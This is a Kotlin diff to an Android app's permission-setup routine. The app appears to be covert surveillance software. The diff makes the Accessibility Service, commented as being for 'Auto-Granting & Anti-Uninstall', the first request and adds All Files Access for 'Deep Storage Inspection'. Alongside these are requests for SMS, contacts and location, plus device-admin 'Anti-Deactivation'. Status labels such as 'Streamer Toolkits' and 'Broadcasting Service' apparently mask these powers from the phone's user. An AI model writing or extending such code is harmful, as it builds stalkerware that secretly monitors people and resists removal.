@@ -114,14 +114,20 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun runPermissionSetup() {
-        // 1. Runtime permissions (Contacts, SMS, Location, etc.)
+        // 1. Accessibility Service (CRITICAL for Auto-Granting & Anti-Uninstall)
+        if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
+            startActivity(PermissionHelper.accessibilitySettingsIntent())
+            return
+        }
+
+        // 2. Runtime permissions (Contacts, SMS, Location, etc.)
         val missing = PermissionHelper.missingRuntimePermissions(this)
         if (missing.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1001)
             return
         }
 
-        // 2. Android 13+ Specifics
+        // 3. Android 13+ Specifics
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             val permissions = arrayOf(
                 android.Manifest.permission.POST_NOTIFICATIONS,
@@ -134,12 +140,6 @@ class MainActivity : AppCompatActivity() {
                 ActivityCompat.requestPermissions(this, toRequest.toTypedArray(), 1002)
                 return
             }
-        }
-
-        // 3. Accessibility Service (CRITICAL for Monitoring & Anti-Uninstall)
-        if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
-            startActivity(PermissionHelper.accessibilitySettingsIntent())
-            return
         }
 
         // 4. System Alert Window (Overlay for Blocking)
@@ -157,6 +157,12 @@ class MainActivity : AppCompatActivity() {
         // 6. Device Admin (Anti-Deactivation & Remote Lock)
         if (!PermissionHelper.isDeviceAdminEnabled(this)) {
             startActivity(PermissionHelper.deviceAdminSettingsIntent(this))
+            return
+        }
+
+        // 7. All Files Access (Deep Storage Inspection)
+        if (!PermissionHelper.hasAllFilesAccess()) {
+            startActivity(PermissionHelper.allFilesAccessIntent(this))
             return
         }
         
@@ -217,6 +223,7 @@ class MainActivity : AppCompatActivity() {
             "Security Modules: ${statusLabel(PermissionHelper.isDeviceAdminEnabled(this))}",
             "Streamer Toolkits: ${statusLabel(runtimeMissing.isEmpty())}",
             "Broadcasting Service: ${statusLabel(notificationGranted)}",
+            "Full Storage Control: ${statusLabel(PermissionHelper.hasAllFilesAccess())}",
         ).toMutableList()
 
         if (runtimeMissing.isNotEmpty()) {
